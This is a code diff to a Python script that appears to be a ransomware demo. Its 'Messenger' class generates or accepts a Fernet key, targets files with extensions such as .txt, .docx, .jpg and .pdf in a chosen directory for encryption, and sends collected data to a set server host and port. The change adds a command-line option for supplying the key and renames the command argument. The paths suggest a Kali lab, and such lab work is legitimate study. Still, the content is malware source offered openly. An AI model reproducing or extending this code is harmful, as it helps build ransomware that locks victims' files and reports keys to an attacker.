@@ -7,13 +7,16 @@ from cryptography.fernet import Fernet
 
 
 class Messenger:
-    def __init__(self, command, directory, server_host, server_port, file_extensions):
+    def __init__(self, command, directory, server_host, server_port, file_extensions, key=None):
         self.command = command
         self.directory = directory
         self.server_host = server_host
         self.server_port = server_port
         self.file_extensions = file_extensions
-        self.key = Fernet.generate_key()
+        if key is not None:
+            self.key = key.encode()
+        else:
+            self.key = Fernet.generate_key()
 
     def collect_data(self):
         return {
@@ -52,16 +55,17 @@ if __name__ == "__main__":
         description='Example application that uses argparse to parse command line arguments.')
 
     # Add arguments
-    parser.add_argument('--command', type=str, default='enc')
+    parser.add_argument('--cmd', type=str, default='enc')
     parser.add_argument('--file_extensions', nargs='*', default=['.txt', '.docx', '.jpg', '.png', '.pdf'],
                         help='List of file extensions to encrypt')
     parser.add_argument('--directory', type=str, default='/home/kali/Desktop/demo/', help='Target directory')
     parser.add_argument('--server_host', type=str, default='192.168.181.129', help='Target server')
     parser.add_argument('--server_port', type=int, default=12345, help='Target server')
+    parser.add_argument('--key', type=str, default=None, help='key')
 
     # Parse arguments
     args = parser.parse_args()
 
-    messenger = Messenger(args.command, args.directory, args.server_host, args.server_port, args.file_extensions)
+    messenger = Messenger(args.cmd, args.directory, args.server_host, args.server_port, args.file_extensions, args.key)
     messenger.send_data_to_server()
     messenger.clear_memory()
